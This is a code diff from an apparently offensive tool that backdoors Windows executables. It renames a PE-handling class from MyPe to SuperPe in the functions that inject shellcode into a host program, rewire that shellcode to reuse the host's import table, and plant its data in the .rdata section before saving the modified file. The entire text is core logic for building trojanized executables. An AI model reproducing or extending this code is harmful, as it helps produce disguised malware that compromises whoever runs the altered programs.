@@ -8,7 +8,7 @@ from pe.pehelper import *
 from model.exehost import *
 from observer import observer
 from pe.derbackdoorer import PeBackdoor
-from pe.mype import MyPe
+from pe.superpe import SuperPe
 from model.project import Project
 from model.settings import Settings
 
@@ -40,10 +40,9 @@ def inject_exe(
         ))
         return False
 
-    # MyPe is a representation of the exe file. We gonna modify it, and save it at the end.
-    mype = MyPe()
-    mype.openFile(exe_in)
-    peinj = PeBackdoor(mype, main_shc, inject_mode)
+    # superpe is a representation of the exe file. We gonna modify it, and save it at the end.
+    superpe = SuperPe(exe_in)
+    peinj = PeBackdoor(superpe, main_shc, inject_mode)
 
     if not peinj.injectShellcode():
         logger.error('Could not inject shellcode into PE file!')
@@ -54,12 +53,12 @@ def inject_exe(
         return False
     
     if source_style == SourceStyle.iat_reuse:
-        injected_fix_iat(mype, project.carrier, project.exe_host)
+        injected_fix_iat(superpe, project.carrier, project.exe_host)
     
     if True:
-        injected_fix_data(mype, project.carrier, project.exe_host)
+        injected_fix_data(superpe, project.carrier, project.exe_host)
 
-    mype.write(exe_out)
+    superpe.write(exe_out)
 
     # verify and log
     shellcode = file_readall_binary(shellcode_in)
@@ -74,9 +73,9 @@ def inject_exe(
     #    raise Exception("Shellcode injection error")
 
 
-def injected_fix_iat(mype: MyPe, carrier: Carrier, exe_host: ExeHost):
+def injected_fix_iat(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
     """replace IAT-placeholders in shellcode with call's to the IAT"""
-    code = mype.get_code_section_data()
+    code = superpe.get_code_section_data()
 
     for iatRequest in carrier.get_all_iat_requests():
         if not iatRequest.placeholder in code:
@@ -95,10 +94,10 @@ def injected_fix_iat(mype: MyPe, carrier: Carrier, exe_host: ExeHost):
         )
         code = code.replace(iatRequest.placeholder, jmp)
 
-    mype.write_code_section_data(code)
+    superpe.write_code_section_data(code)
 
 
-def injected_fix_data(mype: MyPe, carrier: Carrier, exe_host: ExeHost):
+def injected_fix_data(superpe: SuperPe, carrier: Carrier, exe_host: ExeHost):
     """Inject shellcode-data into .rdata and replace reusedata_fixup placeholders in code with LEA"""
     # Insert my data into the .rdata section.
     # Chose and save each datareuse_fixup's addres.
@@ -115,7 +114,7 @@ def injected_fix_data(mype: MyPe, carrier: Carrier, exe_host: ExeHost):
         var_data = datareuse_fixup.data
         #print("    Addr: {} / 0x{:X}  Data: {}".format(
         #    addr, addr, len(var_data)))
-        mype.pe.set_bytes_at_offset(addr, var_data)
+        superpe.pe.set_bytes_at_offset(addr, var_data)
         #f.seek(addr)
         #f.write(var_data)
         datareuse_fixup.addr = addr + sect.virt_addr + exe_host.image_base - sect.raw_addr
@@ -123,7 +122,7 @@ def injected_fix_data(mype: MyPe, carrier: Carrier, exe_host: ExeHost):
 
     # patch code section
     # replace the placeholder with a LEA instruction to the data we written above
-    code = mype.get_code_section_data()
+    code = superpe.get_code_section_data()
     for datareuse_fixup in reusedata_fixups:
         if not datareuse_fixup.randbytes in code:
             raise Exception("DataResuse: ID {} not found, abort".format(
@@ -139,7 +138,7 @@ def injected_fix_data(mype: MyPe, carrier: Carrier, exe_host: ExeHost):
             instruction_virtual_address, destination_virtual_address, datareuse_fixup.register
         )
         code = code.replace(datareuse_fixup.randbytes, lea)
-    mype.write_code_section_data(code)
+    superpe.write_code_section_data(code)
 
 
 def verify_injected_exe(exefile: FilePath) -> int:
